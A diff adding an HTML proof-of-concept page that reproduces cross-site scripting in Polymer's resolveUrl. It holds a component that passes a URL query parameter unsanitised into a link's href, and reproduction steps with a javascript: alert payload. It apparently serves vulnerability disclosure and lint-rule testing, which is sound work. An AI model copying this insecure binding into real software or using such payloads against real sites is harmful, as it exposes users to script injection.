@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Polymer XSS via Insecure URL Resolution</title>
+</head>
+<body>
+
+  <!-- Define the Vulnerable Component -->
+  <script type="module">
+    // Import path tracks one level up to C:\polymer\
+    import { PolymerElement, html } from '../polymer-element.js';
+
+    class ResolveBypassElement extends PolymerElement {
+      static get properties() {
+        return {
+          link: String
+        };
+      }
+      static get template() {
+        /**
+         * The Vulnerability: 
+         * 1. Dynamic binding to href$ attribute.
+         * 2. Processing input via this.resolveUrl().
+         * 3. Polymer's resolveUrl fails to sanitize dangerous protocols like 'javascript:'.
+         */
+        return html`<a id="target" href$="[[_resolve(link)]]" style="color: blue; text-decoration: underline; cursor: pointer;">Click for XSS (URL Bypass)</a>`;
+      }
+
+      _resolve(url) {
+        // This call is what the ESLint rule 'no-insecure-url-resolution' detects
+        return this.resolveUrl(url);
+      }
+    }
+    customElements.define('resolve-bypass-element', ResolveBypassElement);
+  </script>
+
+  <!-- Usage of the Component -->
+  <div style="font-family: sans-serif; padding: 20px; max-width: 800px; margin: auto;">
+    <h1 style="color: #d93025;">Polymer XSS Reproduction: URL Resolution Bypass</h1>
+    <p>This PoC demonstrates a logic bypass in Polymer's <code>resolveUrl</code> utility, which fails to filter executable protocol schemes (e.g., <code>javascript:</code>, <code>data:</code>).</p>
+    <hr>
+    
+    <div style="padding: 15px; border: 1px solid #ccc; border-radius: 8px; background: #fff;">
+      <resolve-bypass-element id="repro"></resolve-bypass-element>
+    </div>
+
+    <div id="instructions" style="margin-top: 20px; padding: 15px; background: #f8f9fa; border: 1px solid #dee2e6; border-radius: 4px;">
+      <strong>Reproduction steps:</strong>
+      <ol>
+        <li>Start a web server in <code>C:\polymer\</code>:
+          <br><code>python -m http.server 8081</code>
+        </li>
+        <li>Navigate to the PoC URL (assuming this file is in <code>C:\polymer\poc\</code>):
+          <br><code>http://localhost:8081/poc/real-poc.html?url=javascript:alert('XSS_SUCCESS_URL_BYPASS')</code>
+        </li>
+        <li>Click the <strong>"Click for XSS"</strong> link above.</li>
+      </ol>
+      <p><strong>Result:</strong> Arbitrary JavaScript executes because the <code>ABS_URL</code> regex in Polymer allows any word followed by a colon as an "absolute URL" without sanitization.</p>
+    </div>
+  </div>
+
+  <!-- Logic to capture URL parameter -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const params = new URLSearchParams(window.location.search);
+      const urlInput = params.get('url');
+      
+      if (urlInput) {
+        const repro = document.getElementById('repro');
+        if (repro) {
+          // Triggers the component process
+          repro.link = urlInput;
+        }
+      }
+    });
+  </script>
+
+</body>
+</html>
